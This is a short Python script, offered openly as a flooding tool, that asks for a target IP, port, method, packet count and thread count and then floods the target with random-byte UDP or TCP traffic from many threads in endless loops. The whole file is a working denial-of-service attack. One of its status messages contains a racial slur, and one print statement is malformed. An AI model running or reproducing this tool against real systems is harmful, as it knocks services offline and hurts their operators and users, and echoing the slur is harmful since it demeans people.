
import random
import socket
import threading
import time
import os,sys

ip = str(input("\033[1;36;40m[+] IP : \033[1;31;40m"))
port = int(input("\033[1;36;40m[+] PORT : \033[1;31;40m"))
choice = str(input("\033[1;36;40m[+] METHODS : \033[1;31;40m"))
times = int(input("\033[1;36;40m[+] PACKETS : \033[1;31;40m"))
threads = int(input("\033[1;36;40m[+] THREADS : \033[1;31;40m"))

os.system("clear")
def run():

	data = random._urandom(1050)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print("attacking server..."%(ip,port))

		except:

			print("Down!!!")



def run2():

	data = random._urandom(102498)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print("\033[1;36;40mNiggas attacks %s Port %s"%(ip,port))

		except:

			s.close()

			print("server is dead please contact costumer service...")

for y in range(threads):
    if choice == 'udp':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'tcp':
        th = threading.Thread(target = run2)
        th.start()
